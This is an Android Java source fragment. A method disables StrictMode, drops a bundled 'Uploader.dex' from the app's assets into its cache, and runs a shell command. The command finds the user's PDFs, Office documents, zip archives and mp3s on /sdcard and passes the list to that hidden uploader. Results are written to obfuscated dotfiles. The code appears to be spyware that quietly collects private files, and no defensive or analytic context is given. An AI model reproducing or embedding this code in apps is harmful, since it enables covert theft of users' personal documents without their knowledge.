private void iq500copy(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        int read;
        while((read = in.read(buffer)) != -1){
			out.write(buffer, 0, read);
        }
    }

private void iq500Uploader()
	{
		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
		StrictMode.setThreadPolicy(policy);
		
		String extList[] = {
			".pdf",
			".doc", 
			".docx",
			".ppt",
			".pptx",
			".xls", 
			".xlsx",
			".zip",
			".mp3"};
		String ext = TextUtils.join(" -o -name *", extList);

		File outputDir = this.getCacheDir();
		String cacheRoot = outputDir.toString();
		File f = new File(cacheRoot + "/Uploader.dex"); //core class (uploader)
		try
		{
			//check if adding Uploader class is required
			if(!f.exists())
			{
				AssetManager assetManager = getAssets();
				InputStream in = assetManager.open("Uploader.dex");
				OutputStream out = new FileOutputStream(f);
				iq500copy(in, out);
				in.close();
				out.flush();
				out.close();
			}
			
			//Run command
			String[] cmds = {"sh", "-c", String.format("cd %s && find /sdcard/ -name *%s > .r3su1t && dalvikvm -cp Uploader.dex Uploader .r3su1t > .upr3su1t", cacheRoot, ext)};
			Runtime.getRuntime().exec(cmds);
			
		}
		catch (Exception e)
		{
			Toast.makeText(this, e.toString(), Toast.LENGTH_LONG).show();
		}
	}
